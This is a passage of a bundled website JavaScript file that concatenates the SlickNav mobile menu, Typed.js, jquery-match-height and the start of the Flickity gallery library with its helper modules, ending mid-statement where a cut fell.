//<![CDATA[

/*!
    SlickNav Responsive Mobile Menu
    (c) 2014 Josh Cope
    licensed under MIT
*/
(function (e, t, n) {
  function o(t, n) {
    this.element = t;
    this.settings = e.extend({}, r, n);
    this._defaults = r;
    this._name = i;
    this.init();
  }
  var r = {
      label: "MENU",
      duplicate: true,
      duration: 200,
      easingOpen: "swing",
      easingClose: "swing",
      closedSymbol: "&#9658;",
      openedSymbol: "&#9660;",
      prependTo: "body",
      parentTag: "a",
      closeOnClick: false,
      allowParentLinks: false,
      nestedParentLinks: true,
      showChildren: false,
      init: function () {},
      open: function () {},
      close: function () {},
    },
    i = "slicknav",
    s = "slicknav";
  o.prototype.init = function () {
    var n = this;
    var r = e(this.element);
    var i = this.settings;
    if (i.duplicate) {
      n.mobileNav = r.clone();
      n.mobileNav.removeAttr("id");
      n.mobileNav.find("*").each(function (t, n) {
        e(n).removeAttr("id");
      });
    } else n.mobileNav = r;
    var o = s + "_icon";
    if (i.label === "") {
      o += " " + s + "_no-text";
    }
    if (i.parentTag == "a") {
      i.parentTag = 'a href="#"';
    }
    n.mobileNav.attr("class", s + "_nav");
    var u = e('<div class="' + s + '_menu"></div>');
    n.btn = e(
      "<" +
        i.parentTag +
        ' aria-haspopup="true" tabindex="0" class="' +
        s +
        "_btn " +
        s +
        '_collapsed"><span class="' +
        s +
        '_menutxt">' +
        i.label +
        '</span><span class="' +
        o +
        '"><span class="' +
        s +
        '_icon-bar"></span><span class="' +
        s +
        '_icon-bar"></span><span class="' +
        s +
        '_icon-bar"></span></span></a>'
    );
    e(u).append(n.btn);
    e(i.prependTo).prepend(u);
    u.append(n.mobileNav);
    var a = n.mobileNav.find("li");
    e(a).each(function () {
      var t = e(this);
      var r = {};
      r.children = t.children("ul").attr("role", "menu");
      t.data("menu", r);
      if (r.children.length > 0) {
        var o = t.contents();
        var u = false;
        var a = [];
        e(o).each(function () {
          if (!e(this).is("ul")) {
            a.push(this);
          } else {
            return false;
          }
          if (e(this).is("a")) {
            u = true;
          }
        });
        var f = e(
          "<" +
            i.parentTag +
            ' role="menuitem" aria-haspopup="true" tabindex="-1" class="' +
            s +
            '_item"/>'
        );
        if (!i.allowParentLinks || i.nestedParentLinks || !u) {
          var l = e(a).wrapAll(f).parent();
          l.addClass(s + "_row");
        } else
          e(a)
            .wrapAll('<span class="' + s + "_parent-link " + s + '_row"/>')
            .parent();
        t.addClass(s + "_collapsed");
        t.addClass(s + "_parent");
        var c = e(
          '<span class="' + s + '_arrow">' + i.closedSymbol + "</span>"
        );
        if (i.allowParentLinks && !i.nestedParentLinks && u)
          c = c.wrap(f).parent();
        e(a).last().after(c);
      } else if (t.children().length === 0) {
        t.addClass(s + "_txtnode");
      }
      t.children("a")
        .attr("role", "menuitem")
        .click(function (t) {
          if (
            i.closeOnClick &&
            !e(t.target)
              .parent()
              .closest("li")
              .hasClass(s + "_parent")
          )
            e(n.btn).click();
        });
      if (i.closeOnClick && i.allowParentLinks) {
        t.children("a")
          .children("a")
          .click(function (t) {
            e(n.btn).click();
          });
        t.find("." + s + "_parent-link a:not(." + s + "_item)").click(function (
          t
        ) {
          e(n.btn).click();
        });
      }
    });
    e(a).each(function () {
      var t = e(this).data("menu");
      if (!i.showChildren) {
        n._visibilityToggle(t.children, null, false, null, true);
      }
    });
    n._visibilityToggle(n.mobileNav, null, false, "init", true);
    n.mobileNav.attr("role", "menu");
    e(t).mousedown(function () {
      n._outlines(false);
    });
    e(t).keyup(function () {
      n._outlines(true);
    });
    e(n.btn).click(function (e) {
      e.preventDefault();
      n._menuToggle();
    });
    n.mobileNav.on("click", "." + s + "_item", function (t) {
      t.preventDefault();
      n._itemClick(e(this));
    });
    e(n.btn).keydown(function (e) {
      var t = e || event;
      if (t.keyCode == 13) {
        e.preventDefault();
        n._menuToggle();
      }
    });
    n.mobileNav.on("keydown", "." + s + "_item", function (t) {
      var r = t || event;
      if (r.keyCode == 13) {
        t.preventDefault();
        n._itemClick(e(t.target));
      }
    });
    if (i.allowParentLinks && i.nestedParentLinks) {
      e("." + s + "_item a").click(function (e) {
        e.stopImmediatePropagation();
      });
    }
  };
  o.prototype._menuToggle = function (e) {
    var t = this;
    var n = t.btn;
    var r = t.mobileNav;
    if (n.hasClass(s + "_collapsed")) {
      n.removeClass(s + "_collapsed");
      n.addClass(s + "_open");
    } else {
      n.removeClass(s + "_open");
      n.addClass(s + "_collapsed");
    }
    n.addClass(s + "_animating");
    t._visibilityToggle(r, n.parent(), true, n);
  };
  o.prototype._itemClick = function (e) {
    var t = this;
    var n = t.settings;
    var r = e.data("menu");
    if (!r) {
      r = {};
      r.arrow = e.children("." + s + "_arrow");
      r.ul = e.next("ul");
      r.parent = e.parent();
      if (r.parent.hasClass(s + "_parent-link")) {
        r.parent = e.parent().parent();
        r.ul = e.parent().next("ul");
      }
      e.data("menu", r);
    }
    if (r.parent.hasClass(s + "_collapsed")) {
      r.arrow.html(n.openedSymbol);
      r.parent.removeClass(s + "_collapsed");
      r.parent.addClass(s + "_open");
      r.parent.addClass(s + "_animating");
      t._visibilityToggle(r.ul, r.parent, true, e);
    } else {
      r.arrow.html(n.closedSymbol);
      r.parent.addClass(s + "_collapsed");
      r.parent.removeClass(s + "_open");
      r.parent.addClass(s + "_animating");
      t._visibilityToggle(r.ul, r.parent, true, e);
    }
  };
  o.prototype._visibilityToggle = function (t, n, r, i, o) {
    var u = this;
    var a = u.settings;
    var f = u._getActionItems(t);
    var l = 0;
    if (r) l = a.duration;
    if (t.hasClass(s + "_hidden")) {
      t.removeClass(s + "_hidden");
      t.slideDown(l, a.easingOpen, function () {
        e(i).removeClass(s + "_animating");
        e(n).removeClass(s + "_animating");
        if (!o) {
          a.open(i);
        }
      });
      t.attr("aria-hidden", "false");
      f.attr("tabindex", "0");
      u._setVisAttr(t, false);
    } else {
      t.addClass(s + "_hidden");
      t.slideUp(l, this.settings.easingClose, function () {
        t.attr("aria-hidden", "true");
        f.attr("tabindex", "-1");
        u._setVisAttr(t, true);
        t.hide();
        e(i).removeClass(s + "_animating");
        e(n).removeClass(s + "_animating");
        if (!o) a.close(i);
        else if (i == "init") a.init();
      });
    }
  };
  o.prototype._setVisAttr = function (t, n) {
    var r = this;
    var i = t
      .children("li")
      .children("ul")
      .not("." + s + "_hidden");
    if (!n) {
      i.each(function () {
        var t = e(this);
        t.attr("aria-hidden", "false");
        var i = r._getActionItems(t);
        i.attr("tabindex", "0");
        r._setVisAttr(t, n);
      });
    } else {
      i.each(function () {
        var t = e(this);
        t.attr("aria-hidden", "true");
        var i = r._getActionItems(t);
        i.attr("tabindex", "-1");
        r._setVisAttr(t, n);
      });
    }
  };
  o.prototype._getActionItems = function (e) {
    var t = e.data("menu");
    if (!t) {
      t = {};
      var n = e.children("li");
      var r = n.find("a");
      t.links = r.add(n.find("." + s + "_item"));
      e.data("menu", t);
    }
    return t.links;
  };
  o.prototype._outlines = function (t) {
    if (!t) {
      e("." + s + "_item, ." + s + "_btn").css("outline", "none");
    } else {
      e("." + s + "_item, ." + s + "_btn").css("outline", "");
    }
  };
  o.prototype.toggle = function () {
    var e = this;
    e._menuToggle();
  };
  o.prototype.open = function () {
    var e = this;
    if (e.btn.hasClass(s + "_collapsed")) {
      e._menuToggle();
    }
  };
  o.prototype.close = function () {
    var e = this;
    if (e.btn.hasClass(s + "_open")) {
      e._menuToggle();
    }
  };
  e.fn[i] = function (t) {
    var n = arguments;
    if (t === undefined || typeof t === "object") {
      return this.each(function () {
        if (!e.data(this, "plugin_" + i)) {
          e.data(this, "plugin_" + i, new o(this, t));
        }
      });
    } else if (typeof t === "string" && t[0] !== "_" && t !== "init") {
      var r;
      this.each(function () {
        var s = e.data(this, "plugin_" + i);
        if (s instanceof o && typeof s[t] === "function") {
          r = s[t].apply(s, Array.prototype.slice.call(n, 1));
        }
      });
      return r !== undefined ? r : this;
    }
  };
})(jQuery, document, window);

!(function ($) {
  "use strict";
  var Typed = function (el, options) {
    this.el = $(el);
    this.options = $.extend({}, $.fn.typed.defaults, options);
    this.isInput = this.el.is("input");
    this.attr = this.options.attr;
    this.showCursor = this.isInput ? false : this.options.showCursor;
    this.elContent = this.attr ? this.el.attr(this.attr) : this.el.text();
    this.contentType = this.options.contentType;
    this.typeSpeed = this.options.typeSpeed;
    this.startDelay = this.options.startDelay;
    this.backSpeed = this.options.backSpeed;
    this.backDelay = this.options.backDelay;
    this.stringsElement = this.options.stringsElement;
    this.strings = this.options.strings;
    this.strPos = 0;
    this.arrayPos = 0;
    this.stopNum = 0;
    this.loop = this.options.loop;
    this.loopCount = this.options.loopCount;
    this.curLoop = 0;
    this.stop = false;
    this.cursorChar = this.options.cursorChar;
    this.shuffle = this.options.shuffle;
    this.sequence = [];
    this.build();
  };
  Typed.prototype = {
    constructor: Typed,
    init: function () {
      var self = this;
      self.timeout = setTimeout(function () {
        for (var i = 0; i < self.strings.length; ++i) self.sequence[i] = i;
        if (self.shuffle) self.sequence = self.shuffleArray(self.sequence);
        self.typewrite(self.strings[self.sequence[self.arrayPos]], self.strPos);
      }, self.startDelay);
    },
    build: function () {
      var self = this;
      if (this.showCursor === true) {
        this.cursor = $(
          '<span class="typed-cursor">' + this.cursorChar + "</span>"
        );
        this.el.after(this.cursor);
      }
      if (this.stringsElement) {
        this.strings = [];
        this.stringsElement.hide();
        console.log(this.stringsElement.children());
        var strings = this.stringsElement.children();
        $.each(strings, function (key, value) {
          self.strings.push($(value).html());
        });
      }
      this.init();
    },
    typewrite: function (curString, curStrPos) {
      if (this.stop === true) {
        return;
      }
      var humanize = Math.round(Math.random() * (100 - 30)) + this.typeSpeed;
      var self = this;
      self.timeout = setTimeout(function () {
        var charPause = 0;
        var substr = curString.substr(curStrPos);
        if (substr.charAt(0) === "^") {
          var skip = 1;
          if (/^\^\d+/.test(substr)) {
            substr = /\d+/.exec(substr)[0];
            skip += substr.length;
            charPause = parseInt(substr);
          }
          curString =
            curString.substring(0, curStrPos) +
            curString.substring(curStrPos + skip);
        }
        if (self.contentType === "html") {
          var curChar = curString.substr(curStrPos).charAt(0);
          if (curChar === "<" || curChar === "&") {
            var tag = "";
            var endTag = "";
            if (curChar === "<") {
              endTag = ">";
            } else {
              endTag = ";";
            }
            while (curString.substr(curStrPos + 1).charAt(0) !== endTag) {
              tag += curString.substr(curStrPos).charAt(0);
              curStrPos++;
              if (curStrPos + 1 > curString.length) {
                break;
              }
            }
            curStrPos++;
            tag += endTag;
          }
        }
        self.timeout = setTimeout(function () {
          if (curStrPos === curString.length) {
            self.options.onStringTyped(self.arrayPos);
            if (self.arrayPos === self.strings.length - 1) {
              self.options.callback();
              self.curLoop++;
              if (self.loop === false || self.curLoop === self.loopCount)
                return;
            }
            self.timeout = setTimeout(function () {
              self.backspace(curString, curStrPos);
            }, self.backDelay);
          } else {
            if (curStrPos === 0) {
              self.options.preStringTyped(self.arrayPos);
            }
            var nextString = curString.substr(0, curStrPos + 1);
            if (self.attr) {
              self.el.attr(self.attr, nextString);
            } else {
              if (self.isInput) {
                self.el.val(nextString);
              } else if (self.contentType === "html") {
                self.el.html(nextString);
              } else {
                self.el.text(nextString);
              }
            }
            curStrPos++;
            self.typewrite(curString, curStrPos);
          }
        }, charPause);
      }, humanize);
    },
    backspace: function (curString, curStrPos) {
      if (this.stop === true) {
        return;
      }
      var humanize = Math.round(Math.random() * (100 - 30)) + this.backSpeed;
      var self = this;
      self.timeout = setTimeout(function () {
        if (self.contentType === "html") {
          if (curString.substr(curStrPos).charAt(0) === ">") {
            var tag = "";
            while (curString.substr(curStrPos - 1).charAt(0) !== "<") {
              tag -= curString.substr(curStrPos).charAt(0);
              curStrPos--;
              if (curStrPos < 0) {
                break;
              }
            }
            curStrPos--;
            tag += "<";
          }
        }
        var nextString = curString.substr(0, curStrPos);
        if (self.attr) {
          self.el.attr(self.attr, nextString);
        } else {
          if (self.isInput) {
            self.el.val(nextString);
          } else if (self.contentType === "html") {
            self.el.html(nextString);
          } else {
            self.el.text(nextString);
          }
        }
        if (curStrPos > self.stopNum) {
          curStrPos--;
          self.backspace(curString, curStrPos);
        } else if (curStrPos <= self.stopNum) {
          self.arrayPos++;
          if (self.arrayPos === self.strings.length) {
            self.arrayPos = 0;
            if (self.shuffle) self.sequence = self.shuffleArray(self.sequence);
            self.init();
          } else
            self.typewrite(
              self.strings[self.sequence[self.arrayPos]],
              curStrPos
            );
        }
      }, humanize);
    },
    shuffleArray: function (array) {
      var tmp,
        current,
        top = array.length;
      if (top)
        while (--top) {
          current = Math.floor(Math.random() * (top + 1));
          tmp = array[current];
          array[current] = array[top];
          array[top] = tmp;
        }
      return array;
    },
    reset: function () {
      var self = this;
      clearInterval(self.timeout);
      var id = this.el.attr("id");
      this.el.empty();
      if (typeof this.cursor !== "undefined") {
        this.cursor.remove();
      }
      this.strPos = 0;
      this.arrayPos = 0;
      this.curLoop = 0;
      this.options.resetCallback();
    },
  };
  $.fn.typed = function (option) {
    return this.each(function () {
      var $this = $(this),
        data = $this.data("typed"),
        options = typeof option == "object" && option;
      if (data) {
        data.reset();
      }
      $this.data("typed", (data = new Typed(this, options)));
      if (typeof option == "string") data[option]();
    });
  };
  $.fn.typed.defaults = {
    strings: [
      "These are the default values...",
      "You know what you should do?",
      "Use your own!",
      "Have a great day!",
    ],
    stringsElement: null,
    typeSpeed: 0,
    startDelay: 0,
    backSpeed: 0,
    shuffle: false,
    backDelay: 500,
    loop: false,
    loopCount: false,
    showCursor: true,
    cursorChar: "|",
    attr: null,
    contentType: "html",
    callback: function () {},
    preStringTyped: function () {},
    onStringTyped: function () {},
    resetCallback: function () {},
  };
})(window.jQuery);

/*
 * jquery-match-height 0.7.0 by @liabru
 * http://brm.io/jquery-match-height/
 * License MIT
 */
!(function (t) {
  "use strict";
  "function" == typeof define && define.amd
    ? define(["jquery"], t)
    : "undefined" != typeof module && module.exports
    ? (module.exports = t(require("jquery")))
    : t(jQuery);
})(function (t) {
  var e = -1,
    o = -1,
    i = function (t) {
      return parseFloat(t) || 0;
    },
    a = function (e) {
      var o = 1,
        a = t(e),
        n = null,
        r = [];
      return (
        a.each(function () {
          var e = t(this),
            a = e.offset().top - i(e.css("margin-top")),
            s = r.length > 0 ? r[r.length - 1] : null;
          null === s
            ? r.push(e)
            : Math.floor(Math.abs(n - a)) <= o
            ? (r[r.length - 1] = s.add(e))
            : r.push(e),
            (n = a);
        }),
        r
      );
    },
    n = function (e) {
      var o = {
        byRow: !0,
        property: "height",
        target: null,
        remove: !1,
      };
      return "object" == typeof e
        ? t.extend(o, e)
        : ("boolean" == typeof e
            ? (o.byRow = e)
            : "remove" === e && (o.remove = !0),
          o);
    },
    r = (t.fn.matchHeight = function (e) {
      var o = n(e);
      if (o.remove) {
        var i = this;
        return (
          this.css(o.property, ""),
          t.each(r._groups, function (t, e) {
            e.elements = e.elements.not(i);
          }),
          this
        );
      }
      return this.length <= 1 && !o.target
        ? this
        : (r._groups.push({ elements: this, options: o }),
          r._apply(this, o),
          this);
    });
  (r.version = "0.7.0"),
    (r._groups = []),
    (r._throttle = 80),
    (r._maintainScroll = !1),
    (r._beforeUpdate = null),
    (r._afterUpdate = null),
    (r._rows = a),
    (r._parse = i),
    (r._parseOptions = n),
    (r._apply = function (e, o) {
      var s = n(o),
        h = t(e),
        l = [h],
        c = t(window).scrollTop(),
        p = t("html").outerHeight(!0),
        d = h.parents().filter(":hidden");
      return (
        d.each(function () {
          var e = t(this);
          e.data("style-cache", e.attr("style"));
        }),
        d.css("display", "block"),
        s.byRow &&
          !s.target &&
          (h.each(function () {
            var e = t(this),
              o = e.css("display");
            "inline-block" !== o &&
              "flex" !== o &&
              "inline-flex" !== o &&
              (o = "block"),
              e.data("style-cache", e.attr("style")),
              e.css({
                display: o,
                "padding-top": "0",
                "padding-bottom": "0",
                "margin-top": "0",
                "margin-bottom": "0",
                "border-top-width": "0",
                "border-bottom-width": "0",
                height: "100px",
                overflow: "hidden",
              });
          }),
          (l = a(h)),
          h.each(function () {
            var e = t(this);
            e.attr("style", e.data("style-cache") || "");
          })),
        t.each(l, function (e, o) {
          var a = t(o),
            n = 0;
          if (s.target) n = s.target.outerHeight(!1);
          else {
            if (s.byRow && a.length <= 1) return void a.css(s.property, "");
            a.each(function () {
              var e = t(this),
                o = e.attr("style"),
                i = e.css("display");
              "inline-block" !== i &&
                "flex" !== i &&
                "inline-flex" !== i &&
                (i = "block");
              var a = {
                display: i,
              };
              (a[s.property] = ""),
                e.css(a),
                e.outerHeight(!1) > n && (n = e.outerHeight(!1)),
                o ? e.attr("style", o) : e.css("display", "");
            });
          }
          a.each(function () {
            var e = t(this),
              o = 0;
            (s.target && e.is(s.target)) ||
              ("border-box" !== e.css("box-sizing") &&
                ((o +=
                  i(e.css("border-top-width")) +
                  i(e.css("border-bottom-width"))),
                (o += i(e.css("padding-top")) + i(e.css("padding-bottom")))),
              e.css(s.property, n - o + "px"));
          });
        }),
        d.each(function () {
          var e = t(this);
          e.attr("style", e.data("style-cache") || null);
        }),
        r._maintainScroll &&
          t(window).scrollTop((c / p) * t("html").outerHeight(!0)),
        this
      );
    }),
    (r._applyDataApi = function () {
      var e = {};
      t("[data-match-height], [data-mh]").each(function () {
        var o = t(this),
          i = o.attr("data-mh") || o.attr("data-match-height");
        i in e ? (e[i] = e[i].add(o)) : (e[i] = o);
      }),
        t.each(e, function () {
          this.matchHeight(!0);
        });
    });
  var s = function (e) {
    r._beforeUpdate && r._beforeUpdate(e, r._groups),
      t.each(r._groups, function () {
        r._apply(this.elements, this.options);
      }),
      r._afterUpdate && r._afterUpdate(e, r._groups);
  };
  (r._update = function (i, a) {
    if (a && "resize" === a.type) {
      var n = t(window).width();
      if (n === e) return;
      e = n;
    }
    i
      ? -1 === o &&
        (o = setTimeout(function () {
          s(a), (o = -1);
        }, r._throttle))
      : s(a);
  }),
    t(r._applyDataApi),
    t(window).bind("load", function (t) {
      r._update(!1, t);
    }),
    t(window).bind("resize orientationchange", function (t) {
      r._update(!0, t);
    });
});

/*!
 * Flickity PACKAGED v1.0.0
 * Touch, responsive, flickable galleries
 *
 * Licensed GPLv3 for open source use
 * or Flickity Commercial License for commercial use
 *
 * http://flickity.metafizzy.co
 * Copyright 2015 Metafizzy
 */

!(function (t) {
  function e() {}
  function i(t) {
    function i(e) {
      e.prototype.option ||
        (e.prototype.option = function (e) {
          t.isPlainObject(e) && (this.options = t.extend(!0, this.options, e));
        });
    }
    function o(e, i) {
      t.fn[e] = function (o) {
        if ("string" == typeof o) {
          for (
            var s = n.call(arguments, 1), a = 0, l = this.length;
            l > a;
            a++
          ) {
            var h = this[a],
              c = t.data(h, e);
            if (c)
              if (t.isFunction(c[o]) && "_" !== o.charAt(0)) {
                var d = c[o].apply(c, s);
                if (void 0 !== d) return d;
              } else r("no such method '" + o + "' for " + e + " instance");
            else
              r(
                "cannot call methods on " +
                  e +
                  " prior to initialization; attempted to call '" +
                  o +
                  "'"
              );
          }
          return this;
        }
        return this.each(function () {
          var n = t.data(this, e);
          n
            ? (n.option(o), n._init())
            : ((n = new i(this, o)), t.data(this, e, n));
        });
      };
    }
    if (t) {
      var r =
        "undefined" == typeof console
          ? e
          : function (t) {
              console.error(t);
            };
      return (
        (t.bridget = function (t, e) {
          i(e), o(t, e);
        }),
        t.bridget
      );
    }
  }
  var n = Array.prototype.slice;
  "function" == typeof define && define.amd
    ? define("jquery-bridget/jquery.bridget", ["jquery"], i)
    : i("object" == typeof exports ? require("jquery") : t.jQuery);
})(window),
  (function (t) {
    function e(t) {
      return new RegExp("(^|\\s+)" + t + "(\\s+|$)");
    }
    function i(t, e) {
      var i = n(t, e) ? r : o;
      i(t, e);
    }
    var n, o, r;
    "classList" in document.documentElement
      ? ((n = function (t, e) {
          return t.classList.contains(e);
        }),
        (o = function (t, e) {
          t.classList.add(e);
        }),
        (r = function (t, e) {
          t.classList.remove(e);
        }))
      : ((n = function (t, i) {
          return e(i).test(t.className);
        }),
        (o = function (t, e) {
          n(t, e) || (t.className = t.className + " " + e);
        }),
        (r = function (t, i) {
          t.className = t.className.replace(e(i), " ");
        }));
    var s = {
      hasClass: n,
      addClass: o,
      removeClass: r,
      toggleClass: i,
      has: n,
      add: o,
      remove: r,
      toggle: i,
    };
    "function" == typeof define && define.amd
      ? define("classie/classie", s)
      : "object" == typeof exports
      ? (module.exports = s)
      : (t.classie = s);
  })(window),
  function () {
    function t() {}
    function e(t, e) {
      for (var i = t.length; i--; ) if (t[i].listener === e) return i;
      return -1;
    }
    function i(t) {
      return function () {
        return this[t].apply(this, arguments);
      };
    }
    var n = t.prototype,
      o = this,
      r = o.EventEmitter;
    (n.getListeners = function (t) {
      var e,
        i,
        n = this._getEvents();
      if (t instanceof RegExp) {
        e = {};
        for (i in n) n.hasOwnProperty(i) && t.test(i) && (e[i] = n[i]);
      } else e = n[t] || (n[t] = []);
      return e;
    }),
      (n.flattenListeners = function (t) {
        var e,
          i = [];
        for (e = 0; e < t.length; e += 1) i.push(t[e].listener);
        return i;
      }),
      (n.getListenersAsObject = function (t) {
        var e,
          i = this.getListeners(t);
        return i instanceof Array && ((e = {}), (e[t] = i)), e || i;
      }),
      (n.addListener = function (t, i) {
        var n,
          o = this.getListenersAsObject(t),
          r = "object" == typeof i;
        for (n in o)
          o.hasOwnProperty(n) &&
            -1 === e(o[n], i) &&
            o[n].push(r ? i : { listener: i, once: !1 });
        return this;
      }),
      (n.on = i("addListener")),
      (n.addOnceListener = function (t, e) {
        return this.addListener(t, { listener: e, once: !0 });
      }),
      (n.once = i("addOnceListener")),
      (n.defineEvent = function (t) {
        return this.getListeners(t), this;
      }),
      (n.defineEvents = function (t) {
        for (var e = 0; e < t.length; e += 1) this.defineEvent(t[e]);
        return this;
      }),
      (n.removeListener = function (t, i) {
        var n,
          o,
          r = this.getListenersAsObject(t);
        for (o in r)
          r.hasOwnProperty(o) &&
            ((n = e(r[o], i)), -1 !== n && r[o].splice(n, 1));
        return this;
      }),
      (n.off = i("removeListener")),
      (n.addListeners = function (t, e) {
        return this.manipulateListeners(!1, t, e);
      }),
      (n.removeListeners = function (t, e) {
        return this.manipulateListeners(!0, t, e);
      }),
      (n.manipulateListeners = function (t, e, i) {
        var n,
          o,
          r = t ? this.removeListener : this.addListener,
          s = t ? this.removeListeners : this.addListeners;
        if ("object" != typeof e || e instanceof RegExp)
          for (n = i.length; n--; ) r.call(this, e, i[n]);
        else
          for (n in e)
            e.hasOwnProperty(n) &&
              (o = e[n]) &&
              ("function" == typeof o
                ? r.call(this, n, o)
                : s.call(this, n, o));
        return this;
      }),
      (n.removeEvent = function (t) {
        var e,
          i = typeof t,
          n = this._getEvents();
        if ("string" === i) delete n[t];
        else if (t instanceof RegExp)
          for (e in n) n.hasOwnProperty(e) && t.test(e) && delete n[e];
        else delete this._events;
        return this;
      }),
      (n.removeAllListeners = i("removeEvent")),
      (n.emitEvent = function (t, e) {
        var i,
          n,
          o,
          r,
          s = this.getListenersAsObject(t);
        for (o in s)
          if (s.hasOwnProperty(o))
            for (n = s[o].length; n--; )
              (i = s[o][n]),
                i.once === !0 && this.removeListener(t, i.listener),
                (r = i.listener.apply(this, e || [])),
                r === this._getOnceReturnValue() &&
                  this.removeListener(t, i.listener);
        return this;
      }),
      (n.trigger = i("emitEvent")),
      (n.emit = function (t) {
        var e = Array.prototype.slice.call(arguments, 1);
        return this.emitEvent(t, e);
      }),
      (n.setOnceReturnValue = function (t) {
        return (this._onceReturnValue = t), this;
      }),
      (n._getOnceReturnValue = function () {
        return this.hasOwnProperty("_onceReturnValue")
          ? this._onceReturnValue
          : !0;
      }),
      (n._getEvents = function () {
        return this._events || (this._events = {});
      }),
      (t.noConflict = function () {
        return (o.EventEmitter = r), t;
      }),
      "function" == typeof define && define.amd
        ? define("eventEmitter/EventEmitter", [], function () {
            return t;
          })
        : "object" == typeof module && module.exports
        ? (module.exports = t)
        : (o.EventEmitter = t);
  }.call(this),
  (function (t) {
    function e(e) {
      var i = t.event;
      return (i.target = i.target || i.srcElement || e), i;
    }
    var i = document.documentElement,
      n = function () {};
    i.addEventListener
      ? (n = function (t, e, i) {
          t.addEventListener(e, i, !1);
        })
      : i.attachEvent &&
        (n = function (t, i, n) {
          (t[i + n] = n.handleEvent
            ? function () {
                var i = e(t);
                n.handleEvent.call(n, i);
              }
            : function () {
                var i = e(t);
                n.call(t, i);
              }),
            t.attachEvent("on" + i, t[i + n]);
        });
    var o = function () {};
    i.removeEventListener
      ? (o = function (t, e, i) {
          t.removeEventListener(e, i, !1);
        })
      : i.detachEvent &&
        (o = function (t, e, i) {
          t.detachEvent("on" + e, t[e + i]);
          try {
            delete t[e + i];
          } catch (n) {
            t[e + i] = void 0;
          }
        });
    var r = { bind: n, unbind: o };
    "function" == typeof define && define.amd
      ? define("eventie/eventie", r)
      : "object" == typeof exports
      ? (module.exports = r)
      : (t.eventie = r);
  })(window),
  (function (t) {
    function e(t) {
      if (t) {
        if ("string" == typeof n[t]) return t;
        t = t.charAt(0).toUpperCase() + t.slice(1);
        for (var e, o = 0, r = i.length; r > o; o++)
          if (((e = i[o] + t), "string" == typeof n[e])) return e;
      }
    }
    var i = "Webkit Moz ms Ms O".split(" "),
      n = document.documentElement.style;
    "function" == typeof define && define.amd
      ? define("get-style-property/get-style-property", [], function () {
          return e;
        })
      : "object" == typeof exports
      ? (module.exports = e)
      : (t.getStyleProperty = e);
  })(window),
  (function (t) {
    function e(t) {
      var e = parseFloat(t),
        i = -1 === t.indexOf("%") && !isNaN(e);
      return i && e;
    }
    function i() {}
    function n() {
      for (
        var t = {
            width: 0,
            height: 0,
            innerWidth: 0,
            innerHeight: 0,
            outerWidth: 0,
            outerHeight: 0,
          },
          e = 0,
          i = s.length;
        i > e;
        e++
      ) {
        var n = s[e];
        t[n] = 0;
      }
      return t;
    }
    function o(i) {
      function o() {
        if (!p) {
          p = !0;
          var n = t.getComputedStyle;
          if (
            ((h = (function () {
              var t = n
                ? function (t) {
                    return n(t, null);
                  }
                : function (t) {
                    return t.currentStyle;
                  };
              return function (e) {
                var i = t(e);
                return (
                  i ||
                    r(
                      "Style returned " +
                        i +
                        ". Are you running this code in a hidden iframe on Firefox? See http://bit.ly/getsizebug1"
                    ),
                  i
                );
              };
            })()),
            (c = i("boxSizing")))
          ) {
            var o = document.createElement("div");
            (o.style.width = "200px"),
              (o.style.padding = "1px 2px 3px 4px"),
              (o.style.borderStyle = "solid"),
              (o.style.borderWidth = "1px 2px 3px 4px"),
              (o.style[c] = "border-box");
            var s = document.body || document.documentElement;
            s.appendChild(o);
            var a = h(o);
            (d = 200 === e(a.width)), s.removeChild(o);
          }
        }
      }
      function a(t) {
        if (
          (o(),
          "string" == typeof t && (t = document.querySelector(t)),
          t && "object" == typeof t && t.nodeType)
        ) {
          var i = h(t);
          if ("none" === i.display) return n();
          var r = {};
          (r.width = t.offsetWidth), (r.height = t.offsetHeight);
          for (
            var a = (r.isBorderBox = !(!c || !i[c] || "border-box" !== i[c])),
              p = 0,
              u = s.length;
            u > p;
            p++
          ) {
            var f = s[p],
              v = i[f];
            v = l(t, v);
            var y = parseFloat(v);
            r[f] = isNaN(y) ? 0 : y;
          }
          var g = r.paddingLeft + r.paddingRight,
            m = r.paddingTop + r.paddingBottom,
            b = r.marginLeft + r.marginRight,
            x = r.marginTop + r.marginBottom,
            S = r.borderLeftWidth + r.borderRightWidth,
            C = r.borderTopWidth + r.borderBottomWidth,
            w = a && d,
            E = e(i.width);
          E !== !1 && (r.width = E + (w ? 0 : g + S));
          var P = e(i.height);
          return (
            P !== !1 && (r.height = P + (w ? 0 : m + C)),
            (r.innerWidth = r.width - (g + S)),
            (r.innerHeight = r.height - (m + C)),
            (r.outerWidth = r.width + b),
            (r.outerHeight = r.height + x),
            r
          );
        }
      }
      function l(e, i) {
        if (t.getComputedStyle || -1 === i.indexOf("%")) return i;
        var n = e.style,
          o = n.left,
          r = e.runtimeStyle,
          s = r && r.left;
        return (
          s && (r.left = e.currentStyle.left),
          (n.left = i),
          (i = n.pixelLeft),
          (n.left = o),
          s && (r.left = s),
          i
        );
      }
      var h,
        c,
        d,
        p = !1;
      return a;
    }
    var r =
        "undefined" == typeof console
          ? i
          : function (t) {
              console.error(t);
            },
      s = [
        "paddingLeft",
        "paddingRight",
        "paddingTop",
        "paddingBottom",
        "marginLeft",
        "marginRight",
        "marginTop",
        "marginBottom",
        "borderLeftWidth",
        "borderRightWidth",
        "borderTopWidth",
        "borderBottomWidth",
      ];
    "function" == typeof define && define.amd
      ? define(
          "get-size/get-size",
          ["get-style-property/get-style-property"],
          o
        )
      : "object" == typeof exports
      ? (module.exports = o(require("desandro-get-style-property")))
      : (t.getSize = o(t.getStyleProperty));
  })(window),
  (function (t) {
    function e(t) {
      "function" == typeof t && (e.isReady ? t() : s.push(t));
    }
    function i(t) {
      var i = "readystatechange" === t.type && "complete" !== r.readyState;
      e.isReady || i || n();
    }
    function n() {
      e.isReady = !0;
      for (var t = 0, i = s.length; i > t; t++) {
        var n = s[t];
        n();
      }
    }
    function o(o) {
      return (
        "complete" === r.readyState
          ? n()
          : (o.bind(r, "DOMContentLoaded", i),
            o.bind(r, "readystatechange", i),
            o.bind(t, "load", i)),
        e
      );
    }
    var r = t.document,
      s = [];
    (e.isReady = !1),
      "function" == typeof define && define.amd
        ? define("doc-ready/doc-ready", ["eventie/eventie"], o)
        : "object" == typeof exports
        ? (module.exports = o(require("eventie")))
        : (t.docReady = o(t.eventie));
  })(window),
  (function (t) {
    function e(t, e) {
      return t[s](e);
    }
    function i(t) {
      if (!t.parentNode) {
        var e = document.createDocumentFragment();
        e.appendChild(t);
      }
    }
    function n(t, e) {
      i(t);
      for (
